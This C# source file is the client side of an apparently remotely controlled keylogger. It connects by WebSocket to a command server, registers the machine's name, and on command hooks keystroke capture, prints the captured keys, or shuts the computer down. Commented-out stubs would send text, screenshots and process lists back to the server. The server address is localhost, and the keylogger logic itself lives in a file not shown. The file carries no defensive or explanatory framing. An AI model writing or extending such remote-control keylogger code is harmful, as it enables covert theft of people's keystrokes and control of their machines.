//using System;
using System.Text;
//using System.Threading;
//using System.Threading.Tasks;
using System.Net.WebSockets;
using System.Text.Json;
//using System.Diagnostics;
//using System.Drawing;
//using System.Drawing.Imaging;
//using System.IO;
using KeyLogger;

class Program
{
    static ClientWebSocket ws = new ClientWebSocket();
    static KeylogController kl = new KeylogController();

    static async Task Main(string[] args)
    {
        Console.WriteLine("Starting client...");

        await ws.ConnectAsync(new Uri("ws://localhost:5000/ws"), CancellationToken.None);

        // REGISTER
        await Send(new
        {
            type = "register",
            clientType = "desktop",
            name = Environment.MachineName
        });

        Console.WriteLine("Connected to server");

        await ReceiveLoop();
    }

    // ================= RECEIVE =================
    static async Task ReceiveLoop()
    {
        var buffer = new byte[8192];

        while (ws.State == WebSocketState.Open)
        {
            var ms = new MemoryStream();
            WebSocketReceiveResult result;

            do
            {
                result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                ms.Write(buffer, 0, result.Count);
            }
            while (!result.EndOfMessage);

            if (result.MessageType == WebSocketMessageType.Text)
            {
                var json = Encoding.UTF8.GetString(ms.ToArray());
                HandleCommand(json);
            }
        }
    }

    // ================= HANDLE =================
    static void HandleCommand(string json)
    {
        using JsonDocument doc = JsonDocument.Parse(json);
        var root = doc.RootElement;

        if (!root.TryGetProperty("type", out var typeProp) || typeProp.GetString() != "command")
            return;

        string from = root.GetProperty("from").GetString();
        string command = root.GetProperty("command").GetString().ToUpper();

        Console.WriteLine("Command: " + command);

        switch (command)
        {
            case "HOOK":
                kl.Hook();
                break;

            case "UNHOOK":
                kl.Unhook();
                break;

            case "PRINT":
                kl.PrintKeys();
                break;

            case "QUIT":
                kl.Stop();
                break;

            case "PROCESS":
                // list process
                break;

            case "APPLICATION":
                // list application
                break;

            case "SHUTDOWN":
                shutdown();
                break;
        }
    }

    // ================= SEND =================
    static async Task Send(object obj)
    {
        var json = JsonSerializer.Serialize(obj);
        var bytes = Encoding.UTF8.GetBytes(json);

        await ws.SendAsync(new ArraySegment<byte>(bytes),
            WebSocketMessageType.Text,
            true,
            CancellationToken.None);
    }

    //static async void SendText(string to, string text)
    //{
    //    string base64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(text));

    //    await Send(new
    //    {
    //        type = "response",
    //        from = Environment.MachineName,
    //        to = to,
    //        data = base64
    //    });
    //}

    //static async void SendImage(string to, byte[] data)
    //{
    //    string base64 = Convert.ToBase64String(data);

    //    await Send(new
    //    {
    //        type = "response",
    //        from = Environment.MachineName,
    //        to = to,
    //        data = base64
    //    });
    //}

    //// ================= FEATURES =================

    //static string GetProcesses()
    //{
    //    var processes = Process.GetProcesses();
    //    StringBuilder sb = new StringBuilder();

    //    foreach (var p in processes)
    //    {
    //        sb.AppendLine(p.ProcessName);
    //    }

    //    return sb.ToString();
    //}

    static void shutdown()
    {
        System.Diagnostics.Process.Start("ShutDown", "-s");
    }
}